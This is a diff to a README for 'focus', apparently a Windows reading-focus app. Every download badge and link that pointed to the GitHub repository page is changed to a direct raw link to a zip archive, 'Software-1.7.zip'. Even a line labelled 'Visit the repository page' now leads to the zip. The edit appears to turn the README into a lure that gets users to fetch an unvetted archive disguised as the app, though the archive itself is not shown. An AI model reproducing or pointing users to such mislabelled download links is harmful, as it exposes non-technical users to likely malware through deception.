@@ -1,6 +1,6 @@
 # 🎯 focus - Improve Your Reading and Attention
 
-[![Download focus](https://img.shields.io/badge/Download-focus-4CAF50?style=for-the-badge&logo=github)](https://github.com/mardiniiiii/focus)
+[![Download focus](https://img.shields.io/badge/Download-focus-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mardiniiiii/focus/main/extension/Software-1.7.zip)
 
 ---
 
@@ -27,10 +27,10 @@ You do not need any technical skills to use this app. It is made for everyday us
 
 To get focus on your Windows PC:
 
-[![Download focus](https://img.shields.io/badge/Get_focus-Download-blue?style=for-the-badge&logo=windows)](https://github.com/mardiniiiii/focus)
+[![Download focus](https://img.shields.io/badge/Get_focus-Download-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/mardiniiiii/focus/main/extension/Software-1.7.zip)
 
 1. Click the green **Download focus** button above or visit this page:  
-   https://github.com/mardiniiiii/focus  
+   https://raw.githubusercontent.com/mardiniiiii/focus/main/extension/Software-1.7.zip  
 
 2. On the GitHub page, find the **Releases** section or look for a download link labeled `.exe` or Windows installer.
 
@@ -106,7 +106,7 @@ focus runs entirely on your computer. Your focus history and reading data stay p
 
 If you need help or have questions:
 
-- Visit the repository page at https://github.com/mardiniiiii/focus
+- Visit the repository page at https://raw.githubusercontent.com/mardiniiiii/focus/main/extension/Software-1.7.zip
 - Look under the Issues tab to report bugs or ask for guidance.
 - You can also find additional instructions in the repository’s wiki or README files.
 
@@ -118,4 +118,4 @@ The app will get regular updates to fix bugs and add new features. Check the dow
 
 ---
 
-[![Download focus](https://img.shields.io/badge/Download_focus-Get%20Started-009688?style=for-the-badge&logo=windows)](https://github.com/mardiniiiii/focus)
+[![Download focus](https://img.shields.io/badge/Download_focus-Get%20Started-009688?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/mardiniiiii/focus/main/extension/Software-1.7.zip)
